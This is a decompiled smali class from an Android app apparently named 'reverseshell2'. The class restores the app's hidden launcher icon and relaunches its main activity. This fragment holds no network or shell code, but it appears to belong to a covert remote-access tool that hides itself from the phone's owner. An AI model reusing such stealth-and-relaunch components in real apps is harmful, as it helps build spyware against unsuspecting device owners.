.class public Lcom/example/reverseshell2/jumper;
.super Ljava/lang/Object;
.source "jumper.java"


# instance fields
.field context:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;

    .line 11
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 12
    iput-object p1, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    .line 13
    return-void
.end method


# virtual methods
.method public init()V
    .locals 3

    .line 16
    new-instance v0, Lcom/example/reverseshell2/functions;

    const/4 v1, 0x0

    invoke-direct {v0, v1}, Lcom/example/reverseshell2/functions;-><init>(Landroid/app/Activity;)V

    iget-object v1, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    invoke-virtual {v0, v1}, Lcom/example/reverseshell2/functions;->unHideAppIcon(Landroid/content/Context;)V

    .line 17
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    const-class v2, Lcom/example/reverseshell2/MainActivity;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 18
    .local v0, "a":Landroid/content/Intent;
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 19
    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 20
    iget-object v1, p0, Lcom/example/reverseshell2/jumper;->context:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 21
    return-void
.end method
